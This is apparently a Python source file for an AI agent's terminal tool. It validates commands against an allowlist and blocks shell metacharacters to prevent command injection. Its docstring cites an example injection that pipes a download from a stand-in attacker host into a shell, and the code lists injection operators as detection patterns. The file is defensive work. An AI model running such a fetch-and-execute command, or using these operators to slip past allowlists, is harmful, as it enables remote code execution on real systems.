"""
Terminal tool with secure command validation.

SECURITY: Validates the full command for shell metacharacters to prevent
command injection via techniques like `echo hi; curl evil.com | sh`.
The allowlist now applies to all commands in a pipeline, not just the first token.
"""

import re
import shlex
import time
from pathlib import Path

from app.core.config import settings
from app.runtime.sandbox import sandbox_manager
from app.schemas.tool_manifest import ToolManifest
from app.schemas.tool_result import ToolResult
from app.tools.base import BaseTool
from app.tools.workspace_paths import session_workspace

manifest = ToolManifest(
    name="terminal",
    description=(
        "Run an allowlisted shell command in the project/workspace root "
        "(e.g. python, git, pytest, npm, ls/dir). Do not use for file edits — use write_file/patch. "
        "Shell operators (;, &&, ||, |, $(), ``) are blocked for security."
    ),
    keywords=[
        "terminal",
        "shell",
        "command",
        "bash",
        "cmd",
        "run",
        "execute",
    ],
    permissions=["terminal.execute"],
    parameters={
        "type": "object",
        "properties": {
            "command": {
                "type": "string",
                "description": "Shell command to run (executable must be allowlisted, no shell operators)",
            },
        },
        "required": ["command"],
        "additionalProperties": False,
    },
)

# Shell metacharacters that enable command chaining/injection
# These allow bypassing the allowlist by running arbitrary commands after the first
_DANGEROUS_SHELL_PATTERNS = [
    (r";", "semicolon (;) - command separator"),
    (r"&&", "double ampersand (&&) - command chaining"),
    (r"\|\|", "double pipe (||) - conditional execution"),
    (r"\|(?!\|)", "pipe (|) - command piping"),
    (r"\$\(", "command substitution $()"),
    (r"`", "backtick command substitution"),
    (r"\$\{", "variable expansion ${...}"),
    (r">", "output redirection (>)"),
    (r"<", "input redirection (<)"),
    (r"\n", "newline - command separator"),
    (r"\r", "carriage return"),
]


def _validate_command_security(cmd: str) -> None:
    """
    Validate that a command doesn't contain shell injection vectors.

    Raises:
        PermissionError: If dangerous shell metacharacters are found.
    """
    for pattern, description in _DANGEROUS_SHELL_PATTERNS:
        if re.search(pattern, cmd):
            raise PermissionError(
                f"Command contains disallowed shell operator: {description}. "
                "For complex operations, break them into separate tool calls."
            )


def _extract_executable(cmd: str) -> str:
    """
    Extract the executable name from a command string.

    Handles:
    - Full paths: /usr/bin/python -> python
    - Windows paths: C:\\Python311\\python.exe -> python
    - Simple commands: python -> python
    """
    try:
        parts = shlex.split(cmd, posix=False)
    except ValueError as exc:
        raise ValueError(f"Invalid command syntax: {exc}") from exc

    if not parts:
        raise ValueError("Command must not be empty.")

    executable = parts[0].lower()
    # Normalize path separators and extract basename
    executable_name = executable.replace("\\", "/").split("/")[-1]
    # Remove .exe extension on Windows
    if executable_name.endswith(".exe"):
        executable_name = executable_name[:-4]

    return executable_name


class TerminalTool(BaseTool):
    manifest = manifest

    async def execute(self, command: str) -> ToolResult:
        start = time.perf_counter()
        workdir: Path | None = None
        cmd = (command or "").strip()

        try:
            if not cmd:
                raise ValueError("Command must not be empty.")

            # SECURITY: Check for shell injection patterns BEFORE checking allowlist
            _validate_command_security(cmd)

            # Extract and validate the executable
            executable_name = _extract_executable(cmd)

            if executable_name not in settings.terminal_allowlist:
                raise PermissionError(
                    f"Command '{executable_name}' is not allowlisted. "
                    f"Allowed: {', '.join(sorted(settings.terminal_allowlist))}"
                )

            workdir = session_workspace()

            # Parse command into argv for exec (safer than shell)
            try:
                argv = shlex.split(cmd, posix=False)
            except ValueError as exc:
                raise ValueError(f"Invalid command syntax: {exc}") from exc

            meta_base = {
                "command": cmd,
                "executable": executable_name,
                "workdir": str(workdir),
            }

            if settings.SANDBOX_FOR_TERMINAL:
                # Sandbox can handle either string or list - pass list for safety
                sandbox = await sandbox_manager.execute(
                    argv,
                    workdir=workdir,
                    timeout=settings.TERMINAL_TIMEOUT_SECONDS,
                )
                stdout = (sandbox.stdout or "").strip()
                stderr = (sandbox.stderr or "").strip()
                if sandbox.success:
                    return ToolResult(
                        success=True,
                        output=stdout or None,
                        execution_time=time.perf_counter() - start,
                        metadata={
                            **meta_base,
                            "returncode": sandbox.exit_code,
                            "sandbox_id": sandbox.sandbox_id,
                            "sandbox": sandbox.metadata,
                        },
                    )

                error = stderr or stdout or f"Exit code {sandbox.exit_code}"
                return ToolResult(
                    success=False,
                    output=stdout or None,
                    error=error,
                    execution_time=time.perf_counter() - start,
                    metadata={
                        **meta_base,
                        "returncode": sandbox.exit_code,
                        "sandbox_id": sandbox.sandbox_id,
                        "sandbox": sandbox.metadata,
                        "stderr": stderr or None,
                    },
                )

            import asyncio

            # SECURITY: Use create_subprocess_exec with argv (no shell interpretation)
            # This prevents any shell metacharacter processing that might bypass validation
            process = await asyncio.create_subprocess_exec(
                *argv,
                cwd=str(workdir),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            try:
                stdout_b, stderr_b = await asyncio.wait_for(
                    process.communicate(),
                    timeout=settings.TERMINAL_TIMEOUT_SECONDS,
                )
            except TimeoutError:
                process.kill()
                await process.communicate()
                raise TimeoutError(
                    f"Command timed out after {settings.TERMINAL_TIMEOUT_SECONDS} seconds."
                )

            output = stdout_b.decode(errors="replace").strip()
            error_output = stderr_b.decode(errors="replace").strip()
            code = process.returncode if process.returncode is not None else -1
            if code != 0:
                return ToolResult(
                    success=False,
                    output=output or None,
                    error=error_output or output or f"Exit code {code}",
                    execution_time=time.perf_counter() - start,
                    metadata={**meta_base, "returncode": code, "stderr": error_output or None},
                )

            return ToolResult(
                success=True,
                output=output or None,
                execution_time=time.perf_counter() - start,
                metadata={**meta_base, "returncode": code},
            )

        except Exception as exc:  # noqa: BLE001
            message = str(exc).strip() or f"{type(exc).__name__}: command failed"
            return ToolResult(
                success=False,
                error=message,
                execution_time=time.perf_counter() - start,
                metadata={
                    "command": cmd or None,
                    "workdir": str(workdir) if workdir else None,
                    "exception": type(exc).__name__,
                },
            )
